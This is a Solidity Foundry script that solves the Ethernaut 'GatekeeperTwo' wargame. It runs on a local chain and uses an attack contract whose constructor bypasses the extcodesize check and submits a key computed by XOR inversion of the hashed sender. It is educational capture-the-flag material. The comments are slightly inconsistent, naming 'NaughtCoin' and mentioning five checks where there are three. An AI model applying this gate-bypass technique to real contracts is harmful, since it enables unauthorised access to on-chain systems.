// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {NaughtCoin} from "../src/GatekeeperTwo.sol";

/*
    We made this script run in local Foundry blockchain. You don't need to have an RPC URL or an address.
    This challenge is kind of hard, and it needs some testing to pass it, as there are 5 checks.
    We made it run in local 
*/

contract GatekeeperTwoSolution is Script {
    // $ forge script script/GatekeeperTwo.s.sol --tc GatekeeperTwoSolution -

    NaughtCoin gateKeeperInstance;
    GateKeeperAttack attackContract;

    function run() external {
        gateKeeperInstance = new NaughtCoin();

        // - To unlock the contract we need to pass three checks:

        // - The first check `gateOne` can be passed by making an indirect call to the function (call a smart contract that calls the function). This will make the `tx.origin` differ from the `msg.sender`.

        // - The second check `gateTwo` checks for the caller, and reverts if it is a contract or not, but But how do we bring the two opposites together, and pass the first and second.
        // - Luckily, `extcodesize` will return 0, which means no contract byte code, if the contract made the call in the constructor. So we can fire `GatekeeperTwo::enter` function in the constructor, and we will pass the second check.

        // - The third check `gateThree` checks that the `getKey`, a variable we should pass as an argument, should match a certain format.
        // - The right format that will let us pass the `gateThree` is to make the `gateKey` (bytes8) opposite in bits to that of the `msg.sender` after hashing it. It is like NOT operator (gate).

        // - By doing these steps you will pass all the checks and enter the contract successfully.
        // - For more info, you can check out the solution in the GitHub repo.

        console.log("entrant:", gateKeeperInstance.entrant());
        attackContract = new GateKeeperAttack(address(gateKeeperInstance));
        console.log("entrant:", gateKeeperInstance.entrant());

        // -----------------
    }
}

contract GateKeeperAttack {
    NaughtCoin gateKeeperInstance;

    constructor(address target) {
        gateKeeperInstance = NaughtCoin(target);

        // For the third check:
        // require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        // ----------------
        // - We will get the firstPart of the left side, which is <uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))>
        // - Remember, the caller will be this contract, so msg.sender in the `GatekeeperTwo` will be the address of this contract.
        // - {^} is the XOR operator, it gives bit-1 if the two bits are opposite, and gives bit-0 if they are the same.
        // - So we will make the `gateKey` is the opposite bits of the `firstPart of the left side` we calculated in the previous steps.
        // - By making this you will get the leftpart consists of 1-bits only, which is the same as right part `type(uint64).max`.
        // - You will pass the third check successfully

        uint64 firstPartLeft = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 gateKey = ~firstPartLeft;

        gateKeeperInstance.enter(bytes8(gateKey));
    }
}
